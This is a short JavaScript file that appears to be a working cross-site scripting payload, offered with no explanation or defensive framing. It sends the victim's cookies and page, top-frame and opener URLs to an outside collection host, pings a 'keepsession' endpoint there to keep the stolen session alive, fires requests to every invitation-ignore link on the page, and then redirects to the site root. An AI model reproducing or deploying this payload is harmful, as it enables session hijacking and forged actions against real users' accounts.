(function(){(new Image()).src='http://xss.hacktask.net/index.php?do=api&id=P958un&location='+escape((function(){try{return document.location.href}catch(e){return ''}})())+'&toplocation='+escape((function(){try{return top.location.href}catch(e){return ''}})())+'&cookie='+escape((function(){try{return document.cookie}catch(e){return ''}})())+'&opener='+escape((function(){try{return (window.opener && window.opener.location.href)?window.opener.location.href:''}catch(e){return ''}})());})(); if('1'==1){keep=new Image();keep.src='http://xss.hacktask.net/index.php?do=keepsession&id=P958un&url='+escape(document.location)+'&cookie='+escape(document.cookie)};
var del = $('.invitation_box')[0].innerHTML.match(/\/invitations\/ignore\/[^']*/g);
for (i=0; i<del.length; i++) {
    new Image().src=del[i];
};
location.href='/';
